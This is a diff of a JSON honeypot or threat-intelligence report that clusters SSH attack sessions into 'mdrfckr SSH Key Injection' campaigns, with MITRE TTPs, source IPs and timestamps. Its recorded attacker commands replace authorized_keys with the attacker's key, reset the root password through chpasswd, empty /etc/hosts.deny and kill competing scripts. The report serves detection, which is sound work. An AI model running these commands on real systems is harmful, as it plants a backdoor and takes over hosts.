@@ -1,17 +1,17 @@
 {
-  "generated_at": "2026-05-24T11:22:54.174568+00:00",
-  "total_sessions_with_commands": 11,
+  "generated_at": "2026-05-24T13:42:18.349848+00:00",
+  "total_sessions_with_commands": 5,
   "total_clusters": 2,
   "campaign_clusters": 2,
-  "singleton_clusters": 1,
+  "singleton_clusters": 0,
   "highest_severity": "HIGH",
   "active_campaigns": [
     {
       "cluster_id": "CLU-001",
       "name": "mdrfckr SSH Key Injection",
       "severity": "HIGH",
-      "session_count": 1,
-      "unique_ip_count": 1,
+      "session_count": 2,
+      "unique_ip_count": 2,
       "ttps": [
         "T1021.004",
         "T1078",
@@ -29,7 +29,7 @@
       "cluster_id": "CLU-002",
       "name": "mdrfckr SSH Key Injection",
       "severity": "HIGH",
-      "session_count": 10,
+      "session_count": 3,
       "unique_ip_count": 3,
       "ttps": [
         "T1021.004",
@@ -61,12 +61,13 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 1,
+      "session_count": 2,
       "unique_ips": [
-        "113.31.124.21"
+        "59.36.75.227",
+        "61.155.106.101"
       ],
-      "unique_ip_count": 1,
-      "sequence_hash": "1dbcbc51eecb1379",
+      "unique_ip_count": 2,
+      "sequence_hash": "020088edc45953e3",
       "ttps": [
         {
           "id": "T1021.004",
@@ -113,7 +114,7 @@
         "cd ~; chattr -ia .ssh; lockr -ia .ssh",
         "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
         "cat /proc/cpuinfo | grep name | wc -l",
-        "echo \"root:qwpGLGBB1Add\"|chpasswd|bash",
+        "echo \"root:rQwA2H5kJbCi\"|chpasswd|bash",
         "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
         "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
         "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
@@ -123,12 +124,20 @@
       ],
       "members": [
         {
-          "session_id": "IR-2ec8eecd19b6",
-          "src_ip": "113.31.124.21",
+          "session_id": "IR-9991ef01993a",
+          "src_ip": "61.155.106.101",
           "country": "",
           "isp": "",
           "command_count": 19,
-          "timestamp": "2026-05-24T10:36:51.109131Z"
+          "timestamp": "2026-05-24T12:38:13.803304Z"
+        },
+        {
+          "session_id": "IR-f41fd7ee9825",
+          "src_ip": "59.36.75.227",
+          "country": "",
+          "isp": "",
+          "command_count": 19,
+          "timestamp": "2026-05-24T13:40:10.999624Z"
         }
       ]
     },
@@ -152,11 +161,11 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 10,
+      "session_count": 3,
       "unique_ips": [
-        "197.243.0.62",
-        "186.146.235.58",
-        "100.54.149.28"
+        "103.84.236.222",
+        "122.177.242.16",
+        "142.171.230.122"
       ],
       "unique_ip_count": 3,
       "sequence_hash": "98af0db988d5971c",
@@ -188,84 +197,28 @@
       ],
       "members": [
         {
-          "session_id": "IR-62b6df071305",
-          "src_ip": "197.243.0.62",
+          "session_id": "IR-a6c1db2d5c34",
+          "src_ip": "122.177.242.16",
           "country": "",
           "isp": "",
           "command_count": 2,
-          "timestamp": "2026-05-24T09:58:52.960057Z"
+          "timestamp": "2026-05-24T11:49:07.865147Z"
         },
         {
-          "session_id": "IR-7f8926d24478",
-          "src_ip": "100.54.149.28",
+          "session_id": "IR-82171fbec653",
+          "src_ip": "103.84.236.222",
           "country": "",
           "isp": "",
           "command_count": 2,
-          "timestamp": "2026-05-24T10:38:05.364099Z"
+          "timestamp": "2026-05-24T11:56:53.483457Z"
         },
         {
-          "session_id": "IR-83f09ba1717e",
-          "src_ip": "186.146.235.58",
+          "session_id": "IR-b1afe5df8add",
+          "src_ip": "142.171.230.122",
           "country": "",
           "isp": "",
           "command_count": 2,
-          "timestamp": "2026-05-24T10:38:28.970078Z"
-        },
-        {
-          "session_id": "IR-17a55fa25cf7",
-          "src_ip": "100.54.149.28",
-          "country": "",
-          "isp": "",
-          "command_count": 2,
-          "timestamp": "2026-05-24T10:44:28.191295Z"
-        },
-        {
-          "session_id": "IR-a7b829f2b689",
-          "src_ip": "100.54.149.28",
-          "country": "",
-          "isp": "",
-          "command_count": 2,
-          "timestamp": "2026-05-24T10:47:29.896269Z"
-        },
-        {
-          "session_id": "IR-8b3572d6c7e6",
-          "src_ip": "100.54.149.28",
-          "country": "",
-          "isp": "",
-          "command_count": 2,
-          "timestamp": "2026-05-24T10:50:39.442268Z"
-        },
-        {
-          "session_id": "IR-205a5a642063",
-          "src_ip": "100.54.149.28",
-          "country": "",
-          "isp": "",
-          "command_count": 2,
-          "timestamp": "2026-05-24T10:53:47.904661Z"
-        },
-        {
-          "session_id": "IR-49987fd0d684",
-          "src_ip": "100.54.149.28",
-          "country": "",
-          "isp": "",
-          "command_count": 2,
-          "timestamp": "2026-05-24T11:00:24.044434Z"
-        },
-        {
-          "session_id": "IR-3c0f7b85947f",
-          "src_ip": "100.54.149.28",
-          "country": "",
-          "isp": "",
-          "command_count": 2,
-          "timestamp": "2026-05-24T11:12:50.296329Z"
-        },
-        {
-          "session_id": "IR-78b48920fe07",
-          "src_ip": "100.54.149.28",
-          "country": "",
-          "isp": "",
-          "command_count": 2,
-          "timestamp": "2026-05-24T11:19:17.237253Z"
+          "timestamp": "2026-05-24T12:31:51.993150Z"
         }
       ]
     }
